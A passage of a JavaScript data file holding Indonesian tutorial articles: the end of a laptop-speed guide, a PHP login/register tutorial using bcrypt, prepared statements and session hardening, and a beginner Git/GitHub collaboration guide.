        '<h2 id="suhu">5. Periksa Suhu &amp; Debu</h2>' +
        "<p>Thermal throttling membuat CPU sengaja melambat untuk mendinginkan diri — gejalanya: laptop lemot setelah dipakai lama lalu membaik setelah dingin.</p>" +
        "<ul>" +
        "<li>Pantau suhu dengan <strong>HWiNFO</strong> / <strong>Core Temp</strong> (idle 30–50°C, beban &lt; 90°C)</li>" +
        "<li>Bersihkan debu kipas &amp; heatsink dengan <strong>compressed air</strong></li>" +
        "<li>Ganti <strong>thermal paste</strong> yang sudah kering (disarankan tiap 2–3 tahun)</li>" +
        "<li>Jangan pakai laptop di permukaan lembut (kasur, bantal) yang menutup ventilasi</li>" +
        "</ul>" +
        '<h2 id="software">6. Perawatan Software Lain</h2>' +
        codeBlock(
          "bash",
          "# pastikan Windows & driver terbaru\n#   Settings -> Windows Update -> Check for updates\n\n# scan malware (jangan pasang 2 antivirus real-time sekaligus!)\n#   Windows Defender cukup untuk kebanyakan pengguna\n\n# verifikasi integritas sistem file bila ada error\nsfc /scannow\nDISM /Online /Cleanup-Image /RestoreHealth\n\n# reset browser bila terasa berat (cache menumpuk)"
        ) +
        '<h2 id="upgrade">7. Kapan Perlu Upgrade Hardware?</h2>' +
        '<table><thead><tr><th>Gejala</th><th>Solusi</th></tr></thead><tbody>' +
        "<tr><td>Disk usage 100% terus (HDD)</td><td>Upgrade ke <strong>SSD</strong> (paling terasa!)</td></tr>" +
        "<tr><td>Memory > 85% saat kerja normal</td><td>Tambah <strong>RAM</strong></td></tr>" +
        "<tr><td>Baterai cepat habis / menggembung</td><td>Ganti baterai</td></tr>" +
        "<tr><td>Suhu tinggi, kipas berisik</td><td>Clean service + ganti thermal paste</td></tr>" +
        "</tbody></table>" +
        callout(
          "tip",
          "Upgrade <strong>HDD → SSD</strong> adalah cara paling murah &amp; terasa untuk mempercepat laptop lama — booting dan load aplikasi bisa 3–5× lebih cepat, tanpa perlu ganti laptop baru.",
          "TIPS"
        ) +
        '<h2 id="kesimpulan">Kesimpulan</h2>' +
        "<p>Urutan efektif mengatasi laptop lemot: <strong>bersihkan startup &amp; sampah</strong> → <strong>cek suhu dan debu</strong> → <strong>periksa kesehatan disk/RAM</strong> → <strong>upgrade ke SSD/RAM bila perlu</strong>. Sebagian besar kasus laptop lemot diselesaikan di tahap software — sisanya butuh sentuhan hardware.</p>",
    },

    "webdev-login-register-bcrypt": {
      id: "webdev-login-register-bcrypt",
      crumb: "Login & Register PHP + Bcrypt",
      title: "Membuat Sistem Login & Register PHP Native dengan Enkripsi Bcrypt",
      category: "webdev",
      difficulty: "Intermediate",
      excerpt:
        "Tutorial lengkap membuat autentikasi PHP native yang aman: registrasi dengan password_hash bcrypt, login dengan password_verify, session, dan proteksi brute force.",
      date: "2026-10-03",
      readTime: 15,
      lab: "XAMPP / PHP 8.2 + MySQL 8",
      author: "Admin KBHub",
      tags: ["php", "authentication", "bcrypt", "security"],
      content:
        callout(
          "warning",
          "Jangan pernah menyimpan password dalam bentuk <strong>plaintext</strong> atau MD5/SHA1 yang sudah tidak aman. Gunakan <strong>bcrypt</strong> via <code>password_hash()</code> — ini standar minimum autentikasi web modern.",
          "PERINGATAN"
        ) +
        '<h2 id="konsep">1. Konsep Autentikasi yang Aman</h2>' +
        "<ul>" +
        "<li><strong>Hash, bukan enkripsi</strong> — password di-hash satu arah (bcrypt), tidak bisa dibalik</li>" +
        "<li><strong>Salt otomatis</strong> — <code>password_hash()</code> menyisipkan salt acak tiap hash</li>" +
        "<li><strong>password_verify()</strong> — membandingkan password input dengan hash tersimpan</li>" +
        "<li><strong>Session aman</strong> — regenerasi ID session setelah login</li>" +
        "</ul>" +
        '<h2 id="database">2. Siapkan Database &amp; Tabel</h2>' +
        codeBlock(
          "sql",
          "CREATE DATABASE IF NOT EXISTS db_auth;\nUSE db_auth;\n\nCREATE TABLE users (\n  id         INT AUTO_INCREMENT PRIMARY KEY,\n  username   VARCHAR(50)  NOT NULL UNIQUE,\n  email      VARCHAR(100) NOT NULL UNIQUE,\n  password   VARCHAR(255) NOT NULL,   -- cukup panjang untuk hash bcrypt\n  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP\n);"
        ) +
        callout(
          "note",
          "Kolom <code>password</code> harus <strong>VARCHAR(255)</strong> — hash bcrypt menghasilkan string sepanjang 60 karakter. Kolom yang terlalu pendek akan memotong hash dan membuat login gagal."
        ) +
        '<h2 id="koneksi">3. Koneksi Database (PDO)</h2>' +
        codeBlock(
          "php",
          "<?php\n// koneksi.php\n$pdo = new PDO(\n    'mysql:host=127.0.0.1;dbname=db_auth;charset=utf8mb4',\n    'root', '',\n    [\n        PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,\n        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,\n        PDO::ATTR_EMULATE_PREPARES   => false,\n    ]\n);"
        ) +
        '<h2 id="register">4. Registrasi dengan Bcrypt</h2>' +
        codeBlock(
          "php",
          "<?php\n// register.php\nsession_start();\nrequire 'koneksi.php';\n\nif ($_SERVER['REQUEST_METHOD'] === 'POST') {\n    $username = trim($_POST['username'] ?? '');\n    $email    = filter_var(trim($_POST['email'] ?? ''), FILTER_VALIDATE_EMAIL);\n    $password = $_POST['password'] ?? '';\n\n    // validasi dasar\n    $errors = [];\n    if (!preg_match('/^[a-zA-Z0-9_]{3,20}$/', $username))\n        $errors[] = 'Username 3-20 karakter (huruf, angka, underscore).';\n    if ($email === false)\n        $errors[] = 'Email tidak valid.';\n    if (strlen($password) < 8)\n        $errors[] = 'Password minimal 8 karakter.';\n\n    if (!$errors) {\n        // HASH dengan bcrypt — inilah inti keamanannya\n        $hash = password_hash($password, PASSWORD_BCRYPT);\n\n        $stmt = $pdo->prepare(\n            'INSERT INTO users (username, email, password) VALUES (?, ?, ?)'\n        );\n        $stmt->execute([$username, $email, $hash]);\n\n        $_SESSION['info'] = 'Registrasi berhasil, silakan login.';\n        header('Location: login.php');\n        exit;\n    }\n    $_SESSION['errors'] = $errors;\n}"
        ) +
        '<h2 id="login">5. Login dengan password_verify</h2>' +
        codeBlock(
          "php",
          "<?php\n// login.php\nsession_start();\nrequire 'koneksi.php';\n\nif ($_SERVER['REQUEST_METHOD'] === 'POST') {\n    $username = trim($_POST['username'] ?? '');\n    $password = $_POST['password'] ?? '';\n\n    $stmt = $pdo->prepare('SELECT * FROM users WHERE username = ?');\n    $stmt->execute([$username]);\n    $user = $stmt->fetch();\n\n    // verifikasi password against hash tersimpan\n    if ($user && password_verify($password, $user['password'])) {\n        // regenerate session id (cegah session fixation)\n        session_regenerate_id(true);\n\n        $_SESSION['user_id'] = $user['id'];\n        $_SESSION['username'] = $user['username'];\n\n        header('Location: dashboard.php');\n        exit;\n    }\n\n    // pesan error generik (JANGAN bocorkan 'user tidak ada')\n    $_SESSION['errors'] = 'Username atau password salah.';\n    header('Location: login.php');\n    exit;\n}"
        ) +
        callout(
          "note",
          "Pesan error <strong>&quot;Username atau password salah&quot;</strong> (bukan &quot;username tidak ditemukan&quot;) penting agar penyerang tidak bisa membedakan akun mana yang exist — mencegah username enumeration."
        ) +
        '<h2 id="hashing">6. Kenapa Bcrypt, bukan MD5/SHA1?</h2>' +
        '<table><thead><tr><th>Metode</th><th>Sifat</th><th>Aman?</th></tr></thead><tbody>' +
        "<tr><td>MD5 / SHA1</td><td>Cepat, tanpa salt</td><td>TIDAK (rentan rainbow table &amp; brute force)</td></tr>" +
        "<tr><td>Bcrypt</td><td>lambat, salt otomatis, cost bisa diatur</td><td>YA (standar minimum)</td></tr>" +
        "<tr><td>Argon2id</td><td>paling lambat, memory-hard</td><td>Paling aman (PHP 7.2+)</td></tr>" +
        "</tbody></table>" +
        codeBlock(
          "php",
          "<?php\n// bcrypt dengan cost yang lebih tinggi (default 10)\n$hash = password_hash($password, PASSWORD_BCRYPT, ['cost' => 12]);\n\n// opsi modern PHP: Argon2id\n$hash = password_hash($password, PASSWORD_ARGON2ID);\n\n// cek apakah hash perlu diperbarui (mis. setelah cost berubah)\nif (password_needs_rehash($user['password'], PASSWORD_BCRYPT, ['cost' => 12])) {\n    // hash ulang saat user login berikutnya\n}"
        ) +
        '<h2 id="logout">7. Logout &amp; Proteksi Halaman</h2>' +
        codeBlock(
          "php",
          "<?php\n// logout.php\nsession_start();\n$_SESSION = [];\nsession_destroy();\nheader('Location: login.php');\n\n// --- proteksi halaman (dashboard.php) ---\nsession_start();\nif (empty($_SESSION['user_id'])) {\n    header('Location: login.php');\n    exit;\n}"
        ) +
        '<h2 id="brute">8. Proteksi Brute Force</h2>' +
        codeBlock(
          "php",
          "<?php\n// sederhana: batasi percobaan login via session\nclass LoginThrottle {\n    private int $max = 5;      // 5 percobaan\n    private int $lock = 300;   // kunci 5 menit\n\n    public function tooMany(): bool {\n        return isset($_SESSION['login_attempts'])\n            && $_SESSION['login_attempts'] >= $this->max\n            && (time() - $_SESSION['last_attempt']) < $this->lock;\n    }\n\n    public function record(): void {\n        $_SESSION['login_attempts'] = ($_SESSION['login_attempts'] ?? 0) + 1;\n        $_SESSION['last_attempt'] = time();\n    }\n\n    public function reset(): void {\n        unset($_SESSION['login_attempts'], $_SESSION['last_attempt']);\n    }\n}"
        ) +
        '<h2 id="checklist">9. Checklist Keamanan Auth</h2>' +
        "<ul>" +
        "<li><strong>password_hash() + password_verify()</strong> — jangan pernah bandingkan string langsung</li>" +
        "<li><strong>Prepared statements</strong> — anti SQL Injection pada login query</li>" +
        "<li><strong>session_regenerate_id(true)</strong> setelah login — anti session fixation</li>" +
        "<li><strong>Pesan error generik</strong> — cegah username enumeration</li>" +
        "<li><strong>Rate limiting</strong> — memperlambat brute force</li>" +
        "<li><strong>CSRF token</strong> pada form login &amp; register</li>" +
        "</ul>" +
        '<h2 id="kesimpulan">Kesimpulan</h2>' +
        "<p>Autentikasi web yang aman berdiri di atas empat pilar: <strong>hash bcrypt</strong>, <strong>prepared statements</strong>, <strong>regenerasi session</strong>, dan <strong>rate limiting</strong>. Empat langkah ini mencegah mayoritas serangan umum pada sistem login tanpa perlu framework eksternal.</p>" +
        callout(
          "tip",
          "Naik level: setelah menguasai konsep ini, gunakan sistem auth bawaan <strong>Laravel</strong> (Breeze/Jetstream) yang sudah menerapkan semua praktik terbaik di atas secara otomatis.",
          "TIPS"
        ),
    },

    "webdev-git-github": {
      id: "webdev-git-github",
      crumb: "Git & GitHub untuk Tim",
      title: "Panduan Dasar Git & GitHub untuk Kolaborasi Proyek Tim",
      category: "webdev",
      difficulty: "Beginner",
      excerpt:
        "Panduan lengkap Git untuk pemula: inisialisasi repo, commit, branch, merge, hingga alur kolaborasi tim dengan GitHub (push, pull, pull request).",
      date: "2026-10-02",
      readTime: 13,
      lab: "Terminal + GitHub Account",
      author: "Admin KBHub",
      tags: ["git", "github", "version-control", "collaboration"],
      content:
        callout(
          "note",
          "<strong>Git</strong> adalah sistem kontrol versi (menyimpan riwayat perubahan kode), sedangkan <strong>GitHub</strong> adalah platform hosting untuk berbagi repo Git secara daring. Keduanya sering disamakan padahal berbeda."
        ) +
        '<h2 id="konsep">1. Konsep Dasar Git</h2>' +
        '<table><thead><tr><th>Istilah</th><th>Arti</th></tr></thead><tbody>' +
        "<tr><td>Working Directory</td><td>File yang sedang kamu edit</td></tr>" +
        "<tr><td>Staging (Index)</td><td>Area persiapan sebelum di-commit</td></tr>" +
        "<tr><td>Commit</td><td>Snapshot permanen + pesan</td></tr>" +
        "<tr><td>Branch</td><td>Rantai pengembangan paralel</td></tr>" +
        "<tr><td>Remote</td><td>Salinan repo di GitHub</td></tr>" +
        "</tbody></table>" +
        '<h2 id="setup">2. Setup Awal</h2>' +
        codeBlock(
          "bash",
          "# konfigurasi identitas (sekali saja)\ngit config --global user.name \"Nama Kamu\"\ngit config --global user.email \"email@contoh.com\"\ngit config --global init.defaultBranch main\n\n# buat repo baru & inisialisasi\nmkdir proyek-tim && cd proyek-tim\ngit init\n#   Initialized empty Git repository in .../.git/"
        ) +
        '<h2 id="commit">3. Alur Kerja Harian: Add → Commit</h2>' +
        codeBlock(
          "bash",
          "# lihat status file\ngit status\n\n# tandai file ke staging\ngit add index.html            # satu file\ngit add .                     # semua perubahan\n\n# simpan commit dengan pesan jelas\ngit commit -m \"feat: tambah halaman landing\"\n\n# lihat riwayat commit\ngit log --oneline --graph\n# * a1b2c3 (HEAD -> main) feat: tambah halaman landing\n# * d4e5f6 init: inisialisasi proyek"
        ) +
        callout(
          "tip",
          "Tulis pesan commit yang <strong>deskriptif</strong> dan konsisten. Pola konvensional yang umum: <code>feat:</code>, <code>fix:</code>, <code>docs:</code>, <code>refactor:</code> — memudahkan tim memahami riwayat."
        ) +
        '<h2 id="branch">4. Branch &amp; Merge</h2>' +
        codeBlock(
          "bash",
          "# buat & pindah ke branch baru\ngit checkout -b fitur-login\n\n# ... kerja, add, commit di branch ini ...\ngit commit -m \"feat: form login\"\n\n# kembali ke main\ngit checkout main\n\n# gabungkan branch ke main\ngit merge fitur-login\n#   Fast-forward (tanpa konflik)\n\n# hapus branch setelah digabung\ngit branch -d fitur-login"
        ) +
        '<h2 id="konflik">5. Menangani Merge Conflict</h2>' +
        codeBlock(
          "bash",
          "# saat dua orang mengubah baris yang sama:\ngit merge fitur-login\n#   CONFLICT (content): Merge conflict in index.html\n\n# buka file, cari penanda:\n#   <<<<<<< HEAD\n#   kode dari main\n#   =======\n#   kode dari branch\n#   >>>>>>> fitur-login\n\n# hapus penanda, pilih/ gabung kode yang benar, lalu:\ngit add index.html\ngit commit -m \"merge: selesaikan konflik fitur login\""
        ) +
        '<h2 id="remote">6. Menghubungkan ke GitHub</h2>' +
        codeBlock(
          "bash",
          "# tambahkan remote (nama umum: origin)\ngit remote add origin https://github.com/username/proyek-tim.git\n\n# kirim commit ke GitHub\ngit push -u origin main\n#   -u sekali saja agar main otomatis terhubung\n\n# ambil perubahan dari GitHub (milik tim)\ngit pull origin main\n#   = fetch + merge otomatis\n\n# clone repo yang sudah ada\ngit clone https://github.com/username/proyek-tim.git"
        ) +
        '<h2 id="alur-tim">7. Alur Kolaborasi Tim (Git Flow Sederhana)</h2>' +
        "<ol>" +
        "<li>Tarik terbaru dulu: <code>git pull origin main</code></li>" +
        "<li>Buat branch fitur: <code>git checkout -b fitur-x</code></li>" +
        "<li>Kerja, commit dengan pesan jelas</li>" +
        "<li>Push: <code>git push origin fitur-x</code></li>" +
        "<li>Buka <strong>Pull Request</strong> di GitHub untuk review</li>" +
        "<li>Setelah di-merge, hapus branch fitur</li>" +
        "</ol>" +
        '<h2 id="gitignore">8. .gitignore</h2>' +
        codeBlock(
          "bash",
          "# file yang TIDAK boleh ikut ke repo\n#   (kredensial, dependency, file besar)\n\n# contoh .gitignore\nnode_modules/\nvendor/\n.env\n*.log\n.DS_Store\ndist/"
        ) +
        callout(
          "warning",
          "Jangan pernah meng-commit file <code>.env</code> yang berisi kredensial (API key, password database). Jika sudah terlanjur ter-commit, <strong>rotasi semua kredensial</strong> — menghapus dari riwayat tidak cukup karena masih bisa dilacak."
        ) +
        '<h2 id="darurat">9. Perintah Penyelamatan Darurat</h2>' +
        codeBlock(
          "bash",
          "# batalkan perubahan file (belum di-add)\ngit checkout -- file.txt\n\n# lepas file dari staging (belum di-commit)\ngit reset HEAD file.txt\n\n# lihat perbedaan sebelum commit\ngit diff\n\n# lihat siapa mengubah baris tertentu\ngit blame index.html\n\n# cari pesan commit\ngit log --oneline --grep=\"login\""
        ) +
        '<h2 id="kesimpulan">Kesimpulan</h2>' +
        "<p>Alur inti Git sehari-hari hanya beberapa perintah: <strong><code>git pull</code> → <code>git checkout -b</code> → <code>git add</code> → <code>git commit</code> → <code>git push</code></strong>. Kuasai pola ini beserta penanganan konflik, maka kamu sudah siap berkontribusi di proyek tim mana pun.</p>" +
        callout(
          "tip",
          "Berlatih tanpa takut rusak: repo Git aman untuk dieksperimen. Gunakan <strong>GitHub Desktop</strong> atau <strong>GitKraken</strong> bila lebih nyaman dengan GUI, lalu pindah ke terminal setelah familiar dengan konsepnya.",
          "TIPS"
        ),
    },
  };

  window.articlesData = articlesData;
})();
